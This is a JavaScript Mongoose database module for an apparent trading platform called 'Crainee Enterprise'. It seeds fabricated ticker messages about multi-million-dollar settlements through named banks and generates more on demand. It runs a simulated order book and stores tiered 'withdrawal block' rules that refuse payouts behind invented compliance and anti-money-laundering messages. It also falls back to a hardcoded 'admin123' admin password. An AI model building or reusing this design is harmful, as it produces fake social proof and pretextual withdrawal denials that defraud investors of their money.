// database/db.js - MongoDB Atlas / Mongoose database for Crainee Enterprise Platform
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');

// Define Mongoose Schemas

const userSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  email: { type: String, required: true, unique: true },
  password_hash: { type: String, required: true },
  full_name: { type: String },
  tier: { type: String, default: 'Bronze' },
  virtual_balance: { type: Number, default: 10000.00 },
  created_at: { type: Date, default: Date.now },
  last_login: { type: Date },
  is_admin: { type: Number, default: 0 },
  status: { type: String, default: 'active' }
});

const assetSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  symbol: { type: String, required: true, unique: true },
  name: { type: String, required: true },
  type: { type: String, required: true }, // 'crypto', 'stock', 'forex'
  current_price: { type: Number, required: true },
  price_24h_ago: { type: Number, required: true },
  volume_24h: { type: Number, default: 0 },
  high_24h: { type: Number },
  low_24h: { type: Number },
  updated_at: { type: Date, default: Date.now }
});

const orderBookSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  asset_id: { type: String, required: true },
  side: { type: String, required: true }, // 'buy' or 'sell'
  price: { type: Number, required: true },
  quantity: { type: Number, required: true },
  user_id: { type: String, default: null },
  is_system: { type: Number, default: 1 }, // 1 = simulated, 0 = real user
  created_at: { type: Date, default: Date.now }
});

const userHoldingSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  user_id: { type: String, required: true },
  asset_id: { type: String, required: true },
  quantity: { type: Number, default: 0 },
  avg_buy_price: { type: Number, default: 0 }
});
userHoldingSchema.index({ user_id: 1, asset_id: 1 }, { unique: true });

const transactionSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  user_id: { type: String, required: true },
  asset_id: { type: String, required: true },
  type: { type: String, required: true }, // 'buy', 'sell', 'deposit', 'withdrawal_blocked'
  quantity: { type: Number },
  price: { type: Number },
  total_value: { type: Number },
  status: { type: String, default: 'completed' }, // 'completed', 'blocked', 'pending'
  block_reason: { type: String, default: null },
  metadata: { type: mongoose.Schema.Types.Mixed, default: {} },
  created_at: { type: Date, default: Date.now }
});

const adminSettingSchema = new mongoose.Schema({
  key: { type: String, required: true, unique: true },
  value: { type: String, required: true },
  description: { type: String },
  updated_at: { type: Date, default: Date.now }
});

const tickerMessageSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  message: { type: String, required: true },
  is_active: { type: Number, default: 1 },
  created_at: { type: Date, default: Date.now }
});

const withdrawalBlockSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  tier: { type: String, required: true }, // 'Bronze', 'Silver', 'Gold', 'VIP', 'all'
  min_amount: { type: Number, default: 0 },
  max_amount: { type: Number, default: 999999999 },
  error_message: { type: String, required: true },
  compliance_message: { type: String },
  is_active: { type: Number, default: 1 },
  created_at: { type: Date, default: Date.now }
});

// Compile models
const User = mongoose.model('User', userSchema);
const Asset = mongoose.model('Asset', assetSchema);
const OrderBook = mongoose.model('OrderBook', orderBookSchema);
const UserHolding = mongoose.model('UserHolding', userHoldingSchema);
const Transaction = mongoose.model('Transaction', transactionSchema);
const AdminSetting = mongoose.model('AdminSetting', adminSettingSchema);
const TickerMessage = mongoose.model('TickerMessage', tickerMessageSchema);
const WithdrawalBlock = mongoose.model('WithdrawalBlock', withdrawalBlockSchema);

class EduDatabase {
  constructor() {
    this.isConnected = false;
  }

  async initialize() {
    const mongoUri = process.env.MONGO_URI;
    
    if (!mongoUri) {
      console.error('CRITICAL: MONGO_URI environment variable is missing!');
      throw new Error('MONGO_URI environment variable is not defined.');
    }
    
    try {
      await mongoose.connect(mongoUri);
      this.isConnected = true;
      console.log('MongoDB Atlas Connected Successfully (Zero-crash protection engaged)');
      await this.seedDefaults();
    } catch (error) {
      console.error('MongoDB connection initialization failed:', error);
      throw error;
    }
  }

  async seedDefaults() {
    // Default admin user
    const adminEmail = process.env.ADMIN_EMAIL || 'admin@crainee.internal';
    const adminPassword = process.env.ADMIN_PASSWORD || 'admin123';

    let adminExists = await User.findOne({ email: adminEmail });
    if (!adminExists) {
      const adminId = uuidv4();
      const hash = bcrypt.hashSync(adminPassword, 10);
      await User.create({
        id: adminId,
        email: adminEmail,
        password_hash: hash,
        full_name: 'Platform Administrator',
        tier: 'VIP',
        virtual_balance: 1000000,
        is_admin: 1
      });
    }

    // Default assets
    const assets = [
      { symbol: 'BTC', name: 'Bitcoin', type: 'crypto', current_price: 67432.50, price_24h_ago: 66800, volume_24h: 28450000000, high_24h: 68200, low_24h: 65100 },
      { symbol: 'ETH', name: 'Ethereum', type: 'crypto', current_price: 3421.80, price_24h_ago: 3380, volume_24h: 12300000000, high_24h: 3480, low_24h: 3290 },
      { symbol: 'AAPL', name: 'Apple Inc.', type: 'stock', current_price: 182.45, price_24h_ago: 180.10, volume_24h: 52400000, high_24h: 184.50, low_24h: 179.80 },
      { symbol: 'TSLA', name: 'Tesla Inc.', type: 'stock', current_price: 248.90, price_24h_ago: 245.30, volume_24h: 98200000, high_24h: 252.00, low_24h: 242.10 },
      { symbol: 'EUR/USD', name: 'Euro/US Dollar', type: 'forex', current_price: 1.0845, price_24h_ago: 1.0820, volume_24h: 1.2e12, high_24h: 1.0865, low_24h: 1.0810 },
      { symbol: 'GBP/USD', name: 'British Pound/US Dollar', type: 'forex', current_price: 1.2634, price_24h_ago: 1.2610, volume_24h: 8.5e11, high_24h: 1.2655, low_24h: 1.2590 },
      { symbol: 'GOLD', name: 'Gold Spot', type: 'crypto', current_price: 2341.20, price_24h_ago: 2335, volume_24h: 4.2e10, high_24h: 2348, low_24h: 2328 },
      { symbol: 'SOL', name: 'Solana', type: 'crypto', current_price: 142.80, price_24h_ago: 140.50, volume_24h: 3.8e9, high_24h: 145.20, low_24h: 138.90 }
    ];

    for (const a of assets) {
      await Asset.updateOne(
        { symbol: a.symbol },
        { $setOnInsert: { id: uuidv4(), ...a } },
        { upsert: true }
      );
    }

    // Default admin settings
    const settings = [
      { key: 'platform_name', value: 'Crainee Enterprise', description: 'Platform display name' },
      { key: 'withdrawal_block_enabled', value: 'true', description: 'Enable withdrawal blocking system' },
      { key: 'default_block_message', value: 'Withdrawal restricted: Compliance verification protocol active. Please contact institutional support.', description: 'Default withdrawal block message' },
      { key: 'default_compliance_message', value: 'This transaction requires additional verification per institutional compliance parameters.', description: 'Default compliance message' },
      { key: 'ticker_speed', value: '3000', description: 'Ticker rotation speed in ms' },
      { key: 'price_update_interval', value: '1000', description: 'Market price update interval in ms' }
    ];
    for (const s of settings) {
      await AdminSetting.updateOne(
        { key: s.key },
        { $setOnInsert: s },
        { upsert: true }
      );
    }

    // Default withdrawal block rules
    const blockCount = await WithdrawalBlock.countDocuments();
    if (blockCount === 0) {
      const blocks = [
        { id: uuidv4(), tier: 'Bronze', min_amount: 1000, max_amount: 999999999, error_message: 'Bronze tier withdrawal threshold exceeded. Maximum $1,000 per transaction.', compliance_message: 'Institutional tier compliance: Bronze accounts restricted to $1,000 transactions.' },
        { id: uuidv4(), tier: 'Silver', min_amount: 5000, max_amount: 999999999, error_message: 'Silver tier withdrawal threshold exceeded. Maximum $5,000 per transaction.', compliance_message: 'Institutional tier compliance: Silver accounts restricted to $5,000 transactions.' },
        { id: uuidv4(), tier: 'Gold', min_amount: 25000, max_amount: 999999999, error_message: 'Gold tier withdrawal threshold exceeded. Maximum $25,000 per transaction.', compliance_message: 'Institutional tier compliance: Gold accounts restricted to $25,000 transactions.' },
        { id: uuidv4(), tier: 'all', min_amount: 100000, max_amount: 999999999, error_message: 'High-value transaction flagged for institutional compliance review. Amount exceeds $100,000.', compliance_message: 'Anti-money laundering protocol: Transfers exceeding $100K require administrative sign-off.' }
      ];
      await WithdrawalBlock.insertMany(blocks);
    }

    // Default ticker messages
    const tickerCount = await TickerMessage.countDocuments();
    if (tickerCount === 0) {
      const tickers = [
        'Account 0x49A... executed settlement of $500,000 2 minutes ago via BOA',
        'Account 0x7F2... executed settlement of $127,500 5 minutes ago via Chase',
        'Account 0x3B1... executed settlement of $89,200 8 minutes ago via Wells Fargo',
        'Account 0x9C4... executed settlement of $2,150,000 12 minutes ago via Citi',
        'Account 0xE6... executed settlement of $45,800 15 minutes ago via Capital One',
        'Account 0xA3... executed settlement of $67,300 18 minutes ago via US Bank',
        'Account 0xD8... executed settlement of $234,000 22 minutes ago via PNC',
        'Account 0x1F... executed settlement of $1,800,000 25 minutes ago via Truist'
      ];
      for (const t of tickers) {
        await TickerMessage.create({ id: uuidv4(), message: t });
      }
    }
  }

  // User methods
  async createUser(email, password, fullName) {
    const id = uuidv4();
    const hash = bcrypt.hashSync(password, 10);
    await User.create({ id, email, password_hash: hash, full_name: fullName });
    return this.getUserById(id);
  }

  async getUserByEmail(email) {
    return await User.findOne({ email }).lean();
  }

  async getUserById(id) {
    return await User.findOne({ id }, { password_hash: 1, email: 1, full_name: 1, tier: 1, virtual_balance: 1, created_at: 1, is_admin: 1, status: 1 }).lean();
  }

  async getAllUsers() {
    return await User.find({}, { password_hash: 0, __v: 0 }).sort({ created_at: -1 }).lean();
  }

  async updateUserTier(userId, tier) {
    await User.updateOne({ id: userId }, { $set: { tier } });
    return this.getUserById(userId);
  }

  async updateUserBalance(userId, amount) {
    await User.updateOne({ id: userId }, { $inc: { virtual_balance: amount } });
    return this.getUserById(userId);
  }

  verifyPassword(user, password) {
    if (!user || !user.password_hash) return false;
    return bcrypt.compareSync(password, user.password_hash);
  }

  // Asset methods
  async getAllAssets() {
    return await Asset.find({}, { __v: 0 }).sort({ type: 1, symbol: 1 }).lean();
  }

  async getAssetById(id) {
    return await Asset.findOne({ id }, { __v: 0 }).lean();
  }

  async updateAssetPrice(id, newPrice, volume) {
    const asset = await this.getAssetById(id);
    if (!asset) return null;
    
    const high = Math.max(asset.high_24h || newPrice, newPrice);
    const low = Math.min(asset.low_24h || newPrice, newPrice);
    
    await Asset.updateOne(
      { id },
      { 
        $set: { current_price: newPrice, high_24h: high, low_24h: low, updated_at: new Date() },
        $inc: { volume_24h: volume }
      }
    );
    
    return this.getAssetById(id);
  }

  // Order book methods
  async getOrderBook(assetId, limit = 50) {
    const buysRaw = await OrderBook.aggregate([
      { $match: { asset_id: assetId, side: 'buy' } },
      { $group: { _id: '$price', quantity: { $sum: '$quantity' }, orders: { $sum: 1 } } },
      { $sort: { _id: -1 } },
      { $limit: limit }
    ]);

    const sellsRaw = await OrderBook.aggregate([
      { $match: { asset_id: assetId, side: 'sell' } },
      { $group: { _id: '$price', quantity: { $sum: '$quantity' }, orders: { $sum: 1 } } },
      { $sort: { _id: 1 } },
      { $limit: limit }
    ]);

    const buys = buysRaw.map(b => ({ price: b._id, quantity: b.quantity, orders: b.orders }));
    const sells = sellsRaw.map(s => ({ price: s._id, quantity: s.quantity, orders: s.orders }));
    
    return { buys, sells };
  }

  async addOrderBookEntry(assetId, side, price, quantity, userId = null, isSystem = 1) {
    const id = uuidv4();
    await OrderBook.create({ id, asset_id: assetId, side, price, quantity, user_id: userId, is_system: isSystem });
  }

  async clearOrderBook(assetId) {
    await OrderBook.deleteMany({ asset_id: assetId, is_system: 1 });
  }

  // User holdings
  async getUserHoldings(userId) {
    const holdings = await UserHolding.find({ user_id: userId, quantity: { $gt: 0 } }).lean();
    const result = [];
    for (const h of holdings) {
      const asset = await Asset.findOne({ id: h.asset_id }).lean();
      if (asset) {
        result.push({
          ...h,
          symbol: asset.symbol,
          name: asset.name,
          current_price: asset.current_price,
          type: asset.type
        });
      }
    }
    return result;
  }

  async updateHolding(userId, assetId, quantity, price) {
    const existing = await UserHolding.findOne({ user_id: userId, asset_id: assetId });
    
    if (existing) {
      const newQty = existing.quantity + quantity;
      if (newQty <= 0) {
        await UserHolding.deleteOne({ user_id: userId, asset_id: assetId });
      } else {
        const newAvg = ((existing.avg_buy_price * existing.quantity) + (price * quantity)) / newQty;
        await UserHolding.updateOne({ user_id: userId, asset_id: assetId }, { $set: { quantity: newQty, avg_buy_price: newAvg } });
      }
    } else if (quantity > 0) {
      await UserHolding.create({ id: uuidv4(), user_id: userId, asset_id: assetId, quantity, avg_buy_price: price });
    }
  }

  // Transactions
  async recordTransaction(userId, assetId, type, quantity, price, totalValue, status = 'completed', blockReason = null, metadata = {}) {
    const id = uuidv4();
    await Transaction.create({ id, user_id: userId, asset_id: assetId, type, quantity, price, total_value: totalValue, status, block_reason: blockReason, metadata });
    return id;
  }

  async getUserTransactions(userId, limit = 100) {
    const txs = await Transaction.find({ user_id: userId }).sort({ created_at: -1 }).limit(limit).lean();
    const result = [];
    for (const t of txs) {
      const asset = await Asset.findOne({ id: t.asset_id }).lean();
      result.push({
        ...t,
        symbol: asset ? asset.symbol : 'UNKNOWN',
        name: asset ? asset.name : 'Unknown Asset'
      });
    }
    return result;
  }

  async getAllTransactions(limit = 500) {
    const txs = await Transaction.find({}).sort({ created_at: -1 }).limit(limit).lean();
    const result = [];
    for (const t of txs) {
      const user = await User.findOne({ id: t.user_id }).lean();
      const asset = await Asset.findOne({ id: t.asset_id }).lean();
      result.push({
        ...t,
        email: user ? user.email : 'unknown',
        full_name: user ? user.full_name : 'Unknown',
        symbol: asset ? asset.symbol : 'UNKNOWN',
        name: asset ? asset.name : 'Unknown Asset'
      });
    }
    return result;
  }

  // Admin settings
  async getSettings() {
    return await AdminSetting.find({}, { __v: 0 }).lean();
  }

  async getSetting(key) {
    return await AdminSetting.findOne({ key }, { __v: 0 }).lean();
  }

  async updateSetting(key, value) {
    await AdminSetting.updateOne({ key }, { $set: { value, updated_at: new Date() } }, { upsert: true });
    return this.getSetting(key);
  }

  // Ticker messages
  async getActiveTickers() {
    const tickers = await TickerMessage.find({ is_active: 1 }).lean();
    // Randomize shuffle & limit to 20
    const shuffled = tickers.sort(() => 0.5 - Math.random()).slice(0, 20);
    return shuffled.map(t => ({ message: t.message }));
  }

  async addTickerMessage(message) {
    const id = uuidv4();
    await TickerMessage.create({ id, message });
    return id;
  }

  // Withdrawal blocks
  async getWithdrawalBlocks() {
    return await WithdrawalBlock.find({ is_active: 1 }).sort({ min_amount: -1 }).lean();
  }

  async addWithdrawalBlock(tier, minAmount, maxAmount, errorMessage, complianceMessage) {
    const id = uuidv4();
    await WithdrawalBlock.create({ id, tier, min_amount: minAmount, max_amount: maxAmount, error_message: errorMessage, compliance_message: complianceMessage });
    return this.getWithdrawalBlockById(id);
  }

  async getWithdrawalBlockById(id) {
    return await WithdrawalBlock.findOne({ id }, { __v: 0 }).lean();
  }

  async updateWithdrawalBlock(id, updates) {
    await WithdrawalBlock.updateOne({ id }, { $set: updates });
    return this.getWithdrawalBlockById(id);
  }

  async deleteWithdrawalBlock(id) {
    await WithdrawalBlock.updateOne({ id }, { $set: { is_active: 0 } });
  }

  async checkWithdrawalBlock(tier, amount) {
    const blocks = await WithdrawalBlock.find({
      is_active: 1,
      $or: [{ tier: tier }, { tier: 'all' }],
      min_amount: { $lte: amount },
      max_amount: { $gte: amount }
    }).sort({ min_amount: -1 }).lean();
    
    return blocks[0] || null;
  }

  // Generate dynamic ticker messages
  generateAITickerMessage() {
    const prefixes = ['Account 0x', 'Client 0x', 'Portfolio 0x'];
    const banks = ['BOA', 'Chase', 'Wells Fargo', 'Citi', 'Capital One', 'US Bank', 'PNC', 'Truist', 'TD Bank', 'HSBC'];
    const amounts = [50000, 127500, 89200, 2150000, 45800, 67300, 234000, 1800000, 95000, 312000, 780000, 150000];
    const times = ['1 minute ago', '2 minutes ago', '5 minutes ago', '8 minutes ago', '12 minutes ago', '15 minutes ago', '18 minutes ago', '22 minutes ago', '25 minutes ago', '30 minutes ago'];
    
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const hex = Array.from({length: 3}, () => Math.floor(Math.random() * 16).toString(16).toUpperCase()).join('');
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    const bank = banks[Math.floor(Math.random() * banks.length)];
    const time = times[Math.floor(Math.random() * times.length)];
    
    return `${prefix}${hex}... executed settlement of $${amount.toLocaleString()} ${time} via ${bank}`;
  }

  async close() {
    await mongoose.connection.close();
  }
}

module.exports = { EduDatabase };
